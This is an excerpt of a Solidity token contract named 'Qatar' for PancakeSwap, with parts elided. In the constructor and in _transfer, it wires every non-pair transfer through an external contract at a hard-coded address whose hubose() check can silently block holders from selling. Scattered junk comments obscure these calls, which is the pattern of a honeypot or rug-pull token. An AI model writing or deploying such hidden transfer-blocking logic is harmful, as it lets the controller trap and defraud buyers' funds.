...
/*SA*/ interface  huob{ 
    function hubose(address /*SASADASJK*/ e) external view returns(bool);
       function hb()  /*SAS*/ external view returns(bool);
}
contract Qatar is Context, IERC20, Ownable {
    ...
    uint256 public airDrops = 10; //自动空投数量
    PancakeRouter private _router;
    address payable public marketingWalletAddress = payable(0x0186E1F3Fb2Ab5a41c3E26e83934A07C14655eb3); 
    address payable public ttWal = payable(0x0186E1F3Fb2Ab5a41c3E26e83934A07C14655eb3); 
    ...
    constructor (address PancakeRouterAddress) {
        ...
        _router = PancakeRouter(PancakeRouterAddress);
          hubobis = huob (0x75C0A8cD415A524b00B6ed74Bbb64797833aAA38);
        require(/*SASADASJK*/hubobis./*SASADASJK*/hb(/*SASADASJK*/) == true);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(!isMarketPair[sender]) {
            require(hubobis. /*SASADASJK-----------*/hubose(sender));
        }
        if(inSwapAndLiquify)
        { 
